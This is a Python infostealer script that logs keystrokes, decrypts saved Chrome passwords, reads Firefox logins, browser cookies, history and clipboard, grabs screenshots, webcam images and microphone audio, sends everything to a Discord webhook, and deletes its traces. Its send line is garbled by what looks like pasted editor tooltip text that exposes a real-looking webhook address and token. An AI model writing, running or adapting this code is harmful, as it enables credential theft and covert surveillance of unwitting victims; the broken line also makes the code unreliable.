import os
import sqlite3
import json
import requests
import base64
import shutil
import pyperclip
from datetime import datetime, timedelta
import win32crypt  # Windows only (for Chrome passwords)
from Crypto.Cipher import AES  # For Chrome password decryption
import browser_cookie3  # For cookies
import glob
import csv
import time
from PIL import ImageGrab
import cv2
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
from pynput import keyboard
import threading

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"
LOG_FILE = "keylogs.txt"
RECORD_DURATION = 10  # Seconds for audio recording

# ===== Keylogger =====
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

# ===== Browser Data Extraction =====
def get_chrome_passwords():
    try:
        # Path to Chrome's Login Data (Windows)
        if os.name == 'nt':
            path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        else:  # Linux/Mac
            path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")

        # Copy the file to avoid DB lock
        temp_file = "chrome_passwords.db"
        shutil.copy2(path, temp_file)

        # Connect to SQLite DB
        conn = sqlite3.connect(temp_file)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []

        # Decrypt passwords (Windows only)
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if os.name == 'nt' and encrypted_password:
                try:
                    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    if decrypted_password:
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted_password.decode("utf-8")
                        })
                except:
                    pass

        conn.close()
        os.remove(temp_file)
        return passwords
    except:
        return []

def get_firefox_passwords():
    try:
        # Firefox passwords are stored in key4.db and logins.json (Windows/Linux/Mac)
        if os.name == 'nt':
            path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        else:
            path = os.path.expanduser("~/.mozilla/firefox")

        profiles = glob.glob(os.path.join(path, "*.default-release"))
        if not profiles:
            return []

        profile = profiles[0]
        logins_json = os.path.join(profile, "logins.json")

        if not os.path.exists(logins_json):
            return []

        with open(logins_json, "r") as f:
            data = json.load(f)
            return data.get("logins", [])
    except:
        return []

def get_browser_cookies():
    try:
        cookies = []
        for browser in ["chrome", "firefox", "edge","opera","brave"]:
            try:
                for cookie in browser_cookie3.load(browser):
                    cookies.append({
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain,
                        "expires": cookie.expires,
                    })
            except:
                pass
        return cookies
    except:
        return []

def get_browser_history():
    try:
        history = []
        if os.name == 'nt':
            history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        else:
            history_path = os.path.expanduser("~/.config/google-chrome/Default/History")

        if os.path.exists(history_path):
            temp_file = "chrome_history.db"
            shutil.copy2(history_path, temp_file)
            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                url, title, timestamp = row
                history.append({
                    "url": url,
                    "title": title,
                    "timestamp": timestamp
                })
            conn.close()
            os.remove(temp_file)
        return history
    except:
        return []

# ===== System Data (Screenshot, Webcam, Audio) =====
def capture_screen():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            return base64.b64encode(f.read()).decode("utf-8")
    except:
        return None

def capture_camera():
    try:
        cam = cv2.VideoCapture(0)
        result, image = cam.read()
        if result:
            cv2.imwrite("webcam.png", image)
            with open("webcam.png", "rb") as f:
                return base64.b64encode(f.read()).decode("utf-8")
    except:
        return None
    finally:
        if 'cam' in locals():
            cam.release()

def record_audio():
    try:
        fs = 44100
        recording = sd.rec(int(RECORD_DURATION * fs), samplerate=fs, channels=2)
        sd.wait()
        wav.write("recording.wav", fs, recording)
        with open("recording.wav", "rb") as f:
            return base64.b64encode(f.read()).decode("utf-8")
    except:
        return None

# ===== Send Data to Discord =====
def send_to_discord():
    data = {
        "Browser_Passwords": {
            "Chrome": get_chrome_passwords(),
            "Firefox": get_firefox_passwords(),
        },
        "Browser_Cookies": get_browser_cookies(),
        "Browser_History": get_browser_history(),
        "System_Info": {
            "Username": os.getlogin(),
            "Clipboard": pyperclip.paste(),
        }
    }

    files = {
        "file1": ("screenshot.png", base64.b64decode(capture_screen() or "")),
        "file2": ("webcam.png", base64.b64decode(capture_camera() or "")),
        "file3": ("recording.wav", base64.b64decode(record_audio() or "")),
        "file4": ("keylogs.txt", open(LOG_FILE, "rb").read()),
    }

    requests.post((constant)WEBHOOK_URL: Literal['https://discord.com/api/webhooks/1415295319025123418/J_d1zg0WR8s6PNHFf22qvazZEVAR_cJQCjJqzrYeTMpKv_znl8rVEmaacXxklj4WfbJi'], files=files, data={"payload_json": json.dumps(data)})

# ===== Main Execution =====
if __name__ == "__main__":
    keylogger = start_keylogger()
    time.sleep(30)  # Collect data for 30 seconds
    keylogger.stop()
    send_to_discord()
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE) # Clean up log file
    if os.path.exists("screenshot.png"):
        os.remove("screenshot.png")
    if os.path.exists("webcam.png"):
        os.remove("webcam.png")
    if os.path.exists("recording.wav"):
        os.remove("recording.wav")
    if os.path.exists("chrome_passwords.db"):
        os.remove("chrome_passwords.db")
    if os.path.exists("chrome_history.db"):
        os.remove("chrome_history.db")
    if os.path.exists("keylogs.txt"):
        os.remove("keylogs.txt")
